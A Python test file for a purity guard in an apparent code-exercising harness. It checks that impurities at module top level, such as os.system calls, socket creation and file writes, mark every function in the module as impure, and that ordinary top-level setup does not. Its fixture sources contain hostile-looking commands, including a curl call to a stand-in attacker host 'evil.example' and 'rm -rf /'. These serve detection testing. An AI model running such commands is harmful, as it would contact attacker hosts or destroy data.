"""The purity guard must judge a module's TOP LEVEL, not only its function bodies.

`impurity_reasons` answers "what would calling this function do". Reaching any
target in a module means IMPORTING that module first, and the import executes
every top-level statement before a single argument is synthesized. So a module
shaped like this:

    import os
    os.system("...")        # runs at import, for ANY target in this file

    def add(a, b):          # judged pure — its own body is pure
        return a + b

put `add` on the verified-pure fast path, which runs in-process at the real repo
root with the real environment (`_run_verified_pure`). The impurity was one line
away from the def and the guard never looked at it, because `impurity_reasons`
starts from `defs.get(qualname)` and top-level statements are in no def.

The fix reports module-scope impurities on EVERY function in the file, so the
target is demoted to the contained path rather than refused outright — the
import has to happen either way, and containment is what makes it safe.

The second half of this file is the part that keeps the fix honest. The guard
fails CLOSED on unreadable bodies, which is right at function scope and wrong at
module scope: ordinary top-level code is `logger = logging.getLogger(__name__)`
and `router = APIRouter()`, neither of which resolves to a readable body. If
those counted, every real module would be refused and the harness would drive
nothing. Only DEFINITE impurities — the ones the guard actually read — block.
"""

from __future__ import annotations

from exerciser.functions import _facts_from_source, module_scope_impurities


def _at_import(src: str) -> list[str]:
    return module_scope_impurities(src)


# --- the hole, closed -----------------------------------------------------


def test_module_level_os_system_is_reported() -> None:
    src = """
import os

os.system("curl http://evil.example")

def add(a: int, b: int) -> int:
    return a + b
"""
    assert any("os.system()" in r for r in _at_import(src))


def test_the_pure_function_inherits_its_modules_impurity() -> None:
    """The whole point: a pure BODY in an impure MODULE must not reach the fast path."""
    src = """
import os

os.system("curl http://evil.example")

def add(a: int, b: int) -> int:
    return a + b
"""
    impurities = _facts_from_source(src)["add"]["impurities"]
    assert impurities, "a pure body in an impure module was certified clean"
    assert any("at module import" in r for r in impurities)


def test_module_level_socket_is_reported() -> None:
    src = """
import socket

_sock = socket.socket()

def parse(text: str) -> int:
    return len(text)
"""
    assert any("socket" in r for r in _at_import(src))


def test_module_level_write_open_is_reported() -> None:
    src = """
_f = open("/tmp/x", "w")

def parse(text: str) -> int:
    return len(text)
"""
    assert any("opens a file for writing" in r for r in _at_import(src))


def test_every_function_in_the_module_is_demoted_not_just_one() -> None:
    src = """
import os

os.system("rm -rf /")

def a() -> int:
    return 1

def b() -> int:
    return 2
"""
    facts = _facts_from_source(src)
    assert facts["a"]["impurities"] and facts["b"]["impurities"]


def test_the_functions_own_reasons_survive_alongside_the_modules() -> None:
    src = """
import os
import shutil

os.system("echo hi")

def wipe(p: str) -> None:
    shutil.rmtree(p)
"""
    reasons = _facts_from_source(src)["wipe"]["impurities"]
    assert any("at module import" in r for r in reasons)
    assert any("at module import" not in r for r in reasons)


# --- the false-positive wall: ordinary modules must stay drivable ---------


def test_ordinary_service_module_top_level_is_not_impure() -> None:
    """`logger = ...`, `router = ...`, a settings call and constants: all fine.

    If this test fails, the guard has started refusing real modules and the
    harness will drive nothing. That is a worse outcome than the hole above.
    """
    src = """
import logging
from fastapi import APIRouter
from .settings import get_settings

logger = logging.getLogger(__name__)
router = APIRouter()
settings = get_settings()
MAX_BYTES = 10 * 1024
_CACHE: dict[str, int] = {}

def health() -> dict:
    return {"ok": True}
"""
    assert _at_import(src) == []
    assert _facts_from_source(src)["health"]["impurities"] == []


def test_module_with_only_defs_and_imports_is_not_impure() -> None:
    src = """
import os
from typing import Any

def add(a: int, b: int) -> int:
    return a + b
"""
    assert _at_import(src) == []


def test_dataclasses_and_enums_at_module_scope_are_not_impure() -> None:
    src = """
from dataclasses import dataclass
from enum import Enum

@dataclass
class Point:
    x: int
    y: int

class Colour(Enum):
    RED = "red"

DEFAULT = Point(0, 0)

def origin() -> Point:
    return DEFAULT
"""
    assert _at_import(src) == []


def test_unparseable_source_reports_nothing_here() -> None:
    """`source_facts` already skips unreadable files; this must not raise."""
    assert module_scope_impurities("def (") == []
